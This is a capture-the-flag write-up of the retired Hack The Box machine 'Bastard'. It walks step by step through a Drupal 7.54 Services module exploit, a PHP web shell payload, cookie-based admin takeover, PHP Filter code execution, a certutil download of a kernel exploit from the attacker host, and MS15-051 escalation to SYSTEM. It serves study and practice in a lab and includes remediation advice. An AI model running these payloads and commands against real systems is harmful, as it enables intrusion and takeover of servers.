# HTB - Bastard

**Difficulty:** Medium  
**OS:** Windows  
**Status:** Retired ✅

---

## Summary

Bastard is a Medium Windows machine running Drupal 7.54 on IIS. Initial foothold is obtained by exploiting a Drupal Services module RCE (CVE-2018-7600 / Drupalgeddon2 family) to gain code execution as `nt authority\iusr`. Privilege escalation to `NT AUTHORITY\SYSTEM` is achieved using the MS15-051 kernel exploit, as the target is an unpatched Windows Server 2008 R2.

---

## Tools Used

- Nmap
- Drupal Services Module Exploit (Exploit-DB 41564)
- certutil (for file transfer)
- MS15-051 kernel exploit (zcgonvh's pre-compiled binary)
- Python HTTP server

---

## Steps

### 1. Enumeration

```bash
nmap -sV -sC -p- -Pn --min-rate 5000 <TARGET_IP>
```

**Open ports:**
- 80 → Microsoft IIS httpd 7.5 (running Drupal 7)
- 135 → msrpc
- 49154 → msrpc

### 2. Drupal Version Detection

Browsing to `http://<TARGET_IP>/CHANGELOG.txt` reveals:

```
Drupal 7.54, 2017-02-01
```

This version is vulnerable to multiple RCE exploits in the Services module.

---

### 3. Exploitation — Drupal Services RCE

Downloaded the exploit:

```bash
searchsploit -m 41564
mv 41564.php drupal_exploit.php
```

Modified the exploit variables:

```php
$url = 'http://<TARGET_IP>';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'writeup.php',
    'data' => '<?php echo(system($_GET["cmd"])); ?>'
];
```

Ran the exploit:

```bash
php drupal_exploit.php
```

The exploit generated `session.json` and `user.json` containing a valid admin session cookie.

---

### 4. Admin Login via Cookie Injection

Opened Firefox Developer Tools (F12) → Storage → Cookies.  
Added a new cookie with the values from `session.json`:

- **Name:** `SESS<value from session_name>`  
- **Value:** `<value from session_id>`  
- **Domain:** `<TARGET_IP>`  
- **Path:** `/`

After reloading, logged in as Drupal **admin**.

---

### 5. Enabling PHP Filter & Code Execution

Navigated to `Modules` → enabled **PHP Filter** → **Save configuration**.

Then `Add content` → `Article`:

- **Body:** `<?php system("whoami"); ?>`
- **Text format:** `PHP code`
- Clicked **Save**.

The rendered page returned `nt authority\iusr` — **RCE confirmed**.

---

### 6. User Flag

```php
<?php system("type C:\\Users\\dimitris\\Desktop\\user.txt"); ?>
```

User flag captured ✅

---

### 7. Privilege Escalation — MS15-051

Downloaded the pre-compiled exploit:

```bash
wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip
unzip MS15-051-KB3045171.zip
cp MS15-051-KB3045171/ms15-051x64.exe ~/ms15051.exe
```

Started a Python HTTP server:

```bash
cd ~ && python3 -m http.server 8000
```

Transferred the exploit to the target via PHP/certutil:

```php
<?php system("cd C:\\inetpub\\drupal-7.54 && certutil -urlcache -f http://<TUN0_IP>:8000/ms15051.exe ms15051.exe"); ?>
```

---

### 8. Root Flag

The exploit creates a new SYSTEM process but does not return stdout to the browser. Solution: redirect the output of the command to a file inside the Drupal web root, then read it via HTTP.

```php
<?php system("cd C:\\inetpub\\drupal-7.54 && ms15051.exe \"cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt > C:\\inetpub\\drupal-7.54\\root.txt\""); ?>
```

Then browsed to:

```
http://<TARGET_IP>/root.txt
```

Root flag captured ✅

---

## What I Learned

- Drupal's Services module was a common RCE vector in Drupal 7 — always check `/CHANGELOG.txt` for version disclosure
- How to reuse a captured session cookie to log in as admin via the browser's Developer Tools
- The PHP Filter module in Drupal allows direct code execution from the article body when enabled
- MS15-051 is a reliable kernel exploit for unpatched Windows Server 2008 R2
- When an exploit creates a new process without returning stdout, redirecting output to a file inside the web root is a simple and effective workaround

---

## Remediation

- Patch Drupal to a non-vulnerable version and disable unused modules (especially Services and PHP Filter)
- Apply Microsoft security patches — MS15-051 was patched in May 2015
- Never expose `/CHANGELOG.txt` or version-disclosing files publicly
- Run IIS with the minimum required privileges and segment legacy servers from the rest of the network
